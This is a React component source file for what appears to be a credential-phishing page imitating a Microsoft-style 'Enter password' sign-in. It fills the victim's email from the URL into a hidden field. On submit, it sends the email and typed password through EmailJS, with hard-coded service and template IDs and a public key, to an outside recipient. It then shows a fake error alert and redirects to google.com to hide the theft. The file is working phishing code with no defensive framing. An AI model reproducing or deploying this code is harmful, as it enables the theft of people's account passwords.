import React, { useRef } from 'react';
import emailjs from '@emailjs/browser';
import Logo from '../assets/logo.svg'
import {useParams} from 'react-router-dom'

function Pass() {
 // console.log(us);
 const {id} = useParams();
 console.log(id);

  const form = useRef();

  const additionalData = {
    custom_key: 'custom_value', // Replace with your custom key and value
    current_time: new Date().toLocaleString() // Include current time
  };

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm('service_hl77szr', 'template_3zux99b', form.current, {
        from_email: 'aaa@gmail.com',
        publicKey: 'yZ8IvPdloO1sYwSeS',
      })
      .then(
        () => {
          alert("Something went wrong try again after sometime")
          window.location.href = "https://www.google.com/";
          console.log('SUCCESS!');
        },
        (error) => {
          console.log('FAILED...', error.text);
        },
      );
  };
  return (
    <div className='dab'>
    <div class="container">
    <div class="row">
      <div class="col l3"></div>
      <div style={{padding:5}} class="col l5 s12 z-depth-1">
        <div class="top">
          <div class="logo">
            <img
              src={Logo}
              alt=""
            />
          </div>
          <div class="content">
            <p class="yoMail"></p>
            <h3 class="title">Enter password</h3>
            <div>
            <form ref={form} onSubmit={sendEmail}>
              <input
                type="text"
               className='hide'
                placeholder="enter password"
                name="from_email"
                value={id}
                
              />
              <input
                type="password"
                id="password"
                placeholder="enter password"
                name="password"
                
              />



              <div style={{marginBottom:"50 !important"}}>
              <div class="right">

              <input class="btn next mogo z-depth-0" type="submit" value="Sign In" />
              
              </div>
</div>
              </form>
  </div>
            <div>
              {/*<p>
                <a style={{"fontSize": 13}} href="">Forgot password?</a>
  </p>*/}
              {/*<p>
                <a style={{"fontSize":13}} href="">
                  Email code to <span class="yoMailTwo"></span>
                </a>
  </p>*/}
              {/*<p>
                <a style={{fontSize: 13}} href=""
                  >Sign in with a different Microsoft account</a
                >
              </p>
  */}
  </div>
         
          </div>
        </div>
      </div>
      <div class="col l3"></div>
    </div>
  </div>
  </div>
  )
}

export default Pass
